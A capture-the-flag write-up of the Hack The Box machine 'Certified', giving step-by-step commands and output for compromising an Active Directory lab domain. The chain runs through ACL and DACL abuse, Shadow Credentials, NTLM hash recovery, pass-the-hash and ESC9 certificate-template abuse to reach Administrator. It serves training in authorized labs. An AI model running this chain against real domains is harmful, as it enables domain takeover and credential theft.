# Hack The Box - Certified

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Certified-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)
![Operating System](https://img.shields.io/badge/OS-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Active Directory](https://img.shields.io/badge/Focus-Active%20Directory-red?style=for-the-badge)

> **Certified** is a Medium-difficulty Windows machine based on an assumed-breach Active Directory scenario. Starting with credentials for the low-privileged user `judith.mader`, the attack chain involves enumerating Active Directory ACLs with BloodHound, abusing `WriteOwner` over the `Management` group, obtaining `GenericWrite` permissions over `management_svc`, performing Shadow Credentials attacks, and finally exploiting an AD CS `ESC9` misconfiguration to compromise the `Administrator` account.

---

## Machine Information

| Property | Value |
|---|---|
| **Machine** | Certified |
| **Platform** | Hack The Box |
| **Operating System** | Windows |
| **Difficulty** | Medium |
| **Domain** | `certified.htb` |
| **Domain Controller** | `DC01.certified.htb` |
| **Main Technologies** | Active Directory, LDAP, Kerberos, SMB, WinRM, AD CS |
| **Main Techniques** | ACL Abuse, DACL Abuse, Shadow Credentials, ESC9, Pass-the-Hash |

---

## Attack Path

```text
judith.mader
      │
      │ WriteOwner
      ▼
Management
      │
      │ Take ownership + modify DACL
      ▼
judith.mader added to Management
      │
      │ GenericWrite
      ▼
management_svc
      │
      │ Shadow Credentials
      ▼
management_svc NTLM Hash
      │
      │ Pass-the-Hash / WinRM
      ▼
User Flag
      │
      │ GenericAll
      ▼
ca_operator
      │
      │ Shadow Credentials
      ▼
ca_operator NTLM Hash
      │
      │ AD CS Enumeration
      ▼
ESC9 - CertifiedAuthentication
      │
      │ UPN Manipulation
      ▼
Administrator Certificate
      │
      │ Certificate Authentication
      ▼
Administrator NTLM Hash
      │
      │ Pass-the-Hash
      ▼
Administrator
      │
      ▼
Root Flag
```

---

# 1. Reconnaissance

The first step was to scan the target and identify the exposed services.

```bash
nmap -sv -sS -sC -p- --min-rate 5000 10.129.231.186 -oN nmap
```

<img width="952" height="761" alt="image" src="https://github.com/user-attachments/assets/324b7443-b7bc-42cc-a4e1-0cc5aadf2d79" />


The scan revealed several services associated with a Windows Active Directory Domain Controller:

```text
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
636/tcp  open  ssl/ldap
```

The presence of Kerberos, LDAP, SMB, and other Active Directory services indicated that the target was operating as a Domain Controller.

The scan also revealed the following information:

```text
Domain: certified.htb
Domain Controller: DC01.certified.htb
```

The domain and Domain Controller were added to `/etc/hosts`:

```bash
echo "10.129.231.186 certified.htb dc01.certified.htb" | sudo tee -a /etc/hosts
```

---

# 2. Active Directory Enumeration

The machine provided the following domain credentials:

```text
Username: judith.mader
Password: judith09
Domain: certified.htb
```

Since valid credentials were available, BloodHound was used to enumerate the Active Directory environment and identify potential privilege escalation paths.

The domain information was collected using `bloodhound-python`:

```bash
bloodhound-python \
-d certified.htb \
-u 'judith.mader' \
-p 'judith09' \
-dc 'dc01.certified.htb' \
-c all \
-ns 10.129.231.186
```

<img width="952" height="367" alt="image" src="https://github.com/user-attachments/assets/99cfd225-f79c-4da8-bf45-85fbfe044adc" />


The collection generated several JSON files containing information about users, groups, computers, domains, organizational units, group policies, and containers.

The Neo4j service was started locally:

```bash
sudo neo4j console
```

The generated JSON files were then imported into BloodHound.

Since valid credentials were available for `judith.mader`, the account was marked as **Owned**.

Using the **Reachable High Value Targets** option, BloodHound revealed the following attack path:

```text
JUDITH.MADER
      │
      │ WriteOwner
      ▼
MANAGEMENT
      │
      │ GenericWrite
      ▼
MANAGEMENT_SVC
      │
      │ CanPSRemote
      ▼
WinRM Access
```

The BloodHound analysis revealed three important relationships:

1. `judith.mader` had the `WriteOwner` permission over the `Management` group.
2. The `Management` group had `GenericWrite` permissions over the `management_svc` account.
3. The `management_svc` account had the `CanPSRemote` property, allowing authentication through WinRM.

The first objective was to abuse the `WriteOwner` permission over the `Management` group.

---

# 3. Abusing WriteOwner over the Management Group

The `WriteOwner` permission allows an attacker to modify the owner of an Active Directory object.

Since `judith.mader` had `WriteOwner` over the `Management` group, the ownership of the group was changed using `bloodyAD`:

```bash
bloodyAD \
--host "10.129.231.186" \
-d "certified.htb" \
-u "judith.mader" \
-p "judith09" \
set owner management judith.mader
```

The ownership was successfully changed:

```text
[+] Old owner was replaced by judith.mader on management
```

After becoming the owner of the `Management` group, `judith.mader` was able to modify the group's DACL.

The Impacket `dacledit.py` script was used to grant `FullControl` permissions to `judith.mader`:

```bash
python3 /opt/impacket-with-dacledit/examples/dacledit.py \
-action 'write' \
-rights 'FullControl' \
-inheritance \
-principal 'judith.mader' \
-target 'management' \
"certified.htb"/"judith.mader":'judith09'
```

The DACL was successfully modified:

```text
[*] DACL backed up to dacledit-<TIMESTAMP>.bak
[*] DACL modified successfully!
```

With full control over the `Management` group, `judith.mader` was added as a member:

```bash
net rpc group addmem "management" "judith.mader" \
-U "certified.htb"/"judith.mader"%'judith09' \
-S "dc01.certified.htb"
```

At this point, the attack path became:

```text
JUDITH.MADER
      │
      │ MemberOf
      ▼
MANAGEMENT
      │
      │ GenericWrite
      ▼
MANAGEMENT_SVC
```

By becoming a member of the `Management` group, `judith.mader` inherited the `GenericWrite` permission over `management_svc`.

---

# 4. Abusing GenericWrite over management_svc

The `GenericWrite` permission allows an attacker to modify writable attributes of the target object.

One of the attributes that can be abused is:

```text
msDS-KeyCredentialLink
```

Modifying this attribute allows the execution of a **Shadow Credentials** attack.

The `pywhisker` tool was used to generate a new certificate and add a Key Credential to the `management_svc` account:

```bash
python3 /opt/pywhisker/pywhisker.py \
-d "certified.htb" \
-u "judith.mader" \
-p "judith09" \
--target "management_svc" \
--action "add"
```

The operation generated a PFX certificate and its corresponding password:

```text
[+] Saved PFX (#PKCS12) certificate & key at path: <MANAGEMENT_SVC_CERTIFICATE>.pfx
[*] Must be used with password: <PFX_PASSWORD>
[*] A TGT can now be obtained with PKINITtools
```

The generated PFX certificate was used to obtain a Kerberos Ticket Granting Ticket for `management_svc`:

```bash
python3 /opt/PKINITtools/gettgtpkinit.py \
-cert-pfx <MANAGEMENT_SVC_CERTIFICATE>.pfx \
certified.htb/management_svc \
-pfx-pass '<PFX_PASSWORD>' \
management_svc.ccache
```

The Kerberos ticket was saved to:

```text
management_svc.ccache
```

The generated credential cache was exported:

```bash
export KRB5CCNAME=management_svc.ccache
```

The key returned by `gettgtpkinit.py` was used with `getnthash.py` to recover the NTLM hash of `management_svc`:

```bash
python3 /opt/PKINITtools/getnthash.py \
-key <MANAGEMENT_SVC_KEY> \
certified.htb/management_svc
```

The NTLM hash was recovered:

```text
a091c1832bcdd4677c28b5a6a1295584
```

The recovered hash was used to authenticate to the target through WinRM:

```bash
evil-winrm \
-i certified.htb \
-u management_svc \
-H a091c1832bcdd4677c28b5a6a1295584
```

Authentication was successful:

```text
*Evil-WinRM* PS C:\Users\management_svc\Documents>
```

The current user was verified:

```powershell
whoami
```

```text
certified\management_svc
```
<img width="947" height="239" alt="image" src="https://github.com/user-attachments/assets/3333db9a-fd97-46a2-9999-1c4a6fd0c964" />


The user flag was located at:

```text
C:\Users\management_svc\Desktop\user.txt
```

The flag was obtained using:

```powershell
type C:\Users\management_svc\Desktop\user.txt
```

---

# 5. Lateral Movement to ca_operator

Further BloodHound analysis revealed another privilege escalation path.

The `management_svc` account had `GenericAll` permissions over the `ca_operator` account:

```text
MANAGEMENT_SVC
      │
      │ GenericAll
      ▼
CA_OPERATOR
```

The `GenericAll` permission provides complete control over the target object.

Since `GenericAll` includes the ability to modify writable attributes, the same Shadow Credentials technique was used to compromise `ca_operator`.

The `pywhisker` tool was executed using the NTLM hash of `management_svc`:

```bash
python3 /opt/pywhisker/pywhisker.py \
-d "certified.htb" \
-u "management_svc" \
-H 'a091c1832bcdd4677c28b5a6a1295584' \
--target "ca_operator" \
--action "add"
```

The operation generated another PFX certificate:

```text
[+] Saved PFX (#PKCS12) certificate & key at path: <CA_OPERATOR_CERTIFICATE>.pfx
[*] Must be used with password: <PFX_PASSWORD>
[*] A TGT can now be obtained with PKINITtools
```

The generated certificate was used to obtain a Kerberos TGT for `ca_operator`:

```bash
python3 /opt/PKINITtools/gettgtpkinit.py \
-cert-pfx <CA_OPERATOR_CERTIFICATE>.pfx \
certified.htb/ca_operator \
-pfx-pass '<PFX_PASSWORD>' \
ca_operator.ccache
```

The TGT was saved to:

```text
ca_operator.ccache
```

The Kerberos credential cache was exported:

```bash
export KRB5CCNAME=ca_operator.ccache
```

The key returned by `gettgtpkinit.py` was used to recover the NTLM hash of `ca_operator`:

```bash
python3 /opt/PKINITtools/getnthash.py \
-key <CA_OPERATOR_KEY> \
certified.htb/ca_operator
```

The NTLM hash was successfully recovered:

```text
b4b86f45c6018f1b664f70805f45d8f2
```

---

# 6. Active Directory Certificate Services Enumeration

The next objective was to enumerate the Active Directory Certificate Services environment.

The AD CS module from NetExec was used to identify the Certificate Authority:

```bash
nxc ldap certified.htb \
-u management_svc \
-H a091c1832bcdd4677c28b5a6a1295584 \
-M adcs
```

The enumeration identified the following Certificate Authority:

```text
CA Name: certified-DC01-CA
CA Host: DC01.certified.htb
```

Certipy was then used to enumerate vulnerable certificate templates using the `ca_operator` NTLM hash:

```bash
certipy find \
-u ca_operator@certified.htb \
-hashes b4b86f45c6018f1b664f70805f45d8f2 \
-vulnerable \
-stdout
```

The enumeration revealed a vulnerable certificate template:

```text
CA Name: certified-DC01-CA

Certificate Templates
Template Name: CertifiedAuthentication

Enrollment Permissions
Enrollment Rights: CERTIFIED.HTB\operator ca

[!] Vulnerabilities
ESC9: 'CERTIFIED.HTB\operator ca' can enroll
and template has no security extension
```

The `CertifiedAuthentication` certificate template was vulnerable to `ESC9`.

This configuration allowed the attack to manipulate the User Principal Name of an account and request a certificate associated with another identity.

---

# 7. Privilege Escalation through ESC9

The original UPN of the `ca_operator` account was:

```text
ca_operator@certified.htb
```

The attack required temporarily changing the UPN to:

```text
Administrator
```

The UPN was modified using the permissions held by `management_svc`:

```bash
certipy-ad account update \
-u management_svc \
-dc-ip 10.129.231.186 \
-hashes a091c1832bcdd4677c28b5a6a1295584 \
-user ca_operator \
-upn Administrator
```

The operation completed successfully:

```text
[*] Updating user 'ca_operator':
    userPrincipalName : Administrator
[*] Successfully updated 'ca_operator'
```

<img width="954" height="148" alt="image" src="https://github.com/user-attachments/assets/04c7b387-109d-4a75-86c3-671fa20ea26f" />


After changing the UPN, a certificate was requested using the vulnerable `CertifiedAuthentication` template:

```bash
certipy-ad req \
-dc-ip 10.129.231.186 \
-u ca_operator \
-hashes b4b86f45c6018f1b664f70805f45d8f2 \
-ca certified-DC01-CA \
-template CertifiedAuthentication \
-debug
```

The certificate request was successful:

```text
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

The generated certificate was:

```text
administrator.pfx
```

<img width="955" height="424" alt="image" src="https://github.com/user-attachments/assets/d85e6827-5860-45a1-9bba-153f01bd3efe" />


Before authenticating with the generated certificate, the original UPN of `ca_operator` was restored:

```bash
certipy-ad account update \
-dc-ip 10.129.231.186 \
-u management_svc \
-hashes a091c1832bcdd4677c28b5a6a1295584 \
-user ca_operator \
-upn ca_operator@certified.htb
```

The restoration completed successfully:

```text
[*] Updating user 'ca_operator':
    userPrincipalName : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

---

# 8. Certificate Authentication as Administrator

The generated `administrator.pfx` certificate was used to authenticate to the Domain Controller as the Administrator account:

```bash
certipy-ad auth \
-pfx 'administrator.pfx' \
-dc-ip 10.129.231.186 \
-domain 'certified.htb'
```

Certipy successfully authenticated using the certificate and saved a Kerberos credential cache:

```text
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb'
```

<img width="945" height="368" alt="image" src="https://github.com/user-attachments/assets/412dc277-4c5a-49f7-9f58-f10380a2e0b1" />


The recovered Administrator NTLM hash was:

```text
0d5b49608bbce1751f708748f67e2d34
```

---

# 9. Pass-the-Hash as Administrator

The recovered Administrator NTLM hash was used to authenticate through WinRM:

```bash
evil-winrm \
-i 10.129.231.186 \
-u Administrator \
-H 0d5b49608bbce1751f708748f67e2d34
```

Authentication was successful:

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

The current user was verified:

```powershell
whoami
```

```text
certified\administrator
```

<img width="954" height="237" alt="image" src="https://github.com/user-attachments/assets/d7516a44-30fe-4614-a607-d1d9451863ba" />


The root flag was located at:

```text
C:\Users\Administrator\Desktop\root.txt
```

The flag was obtained using:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

# Flags

```text
User Flag: HTB{REDACTED}

Root Flag: HTB{REDACTED}
```

---

# Key Takeaways

- BloodHound can identify indirect privilege escalation paths involving users, groups, ACLs, and Active Directory objects.
- `WriteOwner` can be abused to take ownership of an Active Directory object.
- After becoming the owner of an object, its DACL can be modified to grant additional permissions.
- `FullControl` over a group allows an attacker to add users to that group.
- Group membership can provide inherited permissions over other Active Directory objects.
- `GenericWrite` can allow modification of the `msDS-KeyCredentialLink` attribute.
- Shadow Credentials can be used to add a new Key Credential to a target account.
- A generated certificate can be used to obtain a Kerberos TGT through PKINIT.
- A Kerberos ticket can be used to recover the NTLM hash of the compromised account.
- `GenericAll` provides complete control over the target Active Directory object.
- AD CS certificate templates should be audited for insecure configurations.
- The `ESC9` vulnerability can be abused by manipulating a user's UPN and requesting a certificate.
- A certificate generated for a privileged identity can be used to authenticate as that account.
- Pass-the-Hash allows authentication without knowing the plaintext password.

---

# Tools Used

- Nmap
- BloodHound
- bloodhound-python
- Neo4j
- bloodyAD
- Impacket
- dacledit.py
- NetExec
- PyWhisker
- PKINITtools
- Certipy
- Evil-WinRM

---

# Techniques Used

```text
Active Directory Enumeration
BloodHound Enumeration
WriteOwner Abuse
DACL Modification
FullControl Abuse
Group Membership Manipulation
GenericWrite Abuse
GenericAll Abuse
Shadow Credentials
msDS-KeyCredentialLink Manipulation
Kerberos PKINIT
Kerberos Ticket Authentication
NTLM Hash Extraction
Active Directory Certificate Services Enumeration
ESC9 Certificate Template Abuse
UPN Manipulation
Certificate-Based Authentication
Pass-the-Hash
WinRM Authentication
```

---

# References

- [Hack The Box - Certified](https://app.hackthebox.com/machines/Certified)
- [BloodHound](https://github.com/SpecterOps/BloodHound)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [PyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [PKINITtools](https://github.com/dirkjanm/PKINITtools)
- [Certipy](https://github.com/ly4k/Certipy)
- [SpecterOps - Certified Pre-Owned](https://specterops.io/blog/2021/06/17/certified-pre-owned/)

---

> This writeup was created for educational purposes and documents the exploitation of a Hack The Box machine in an authorized laboratory environment.
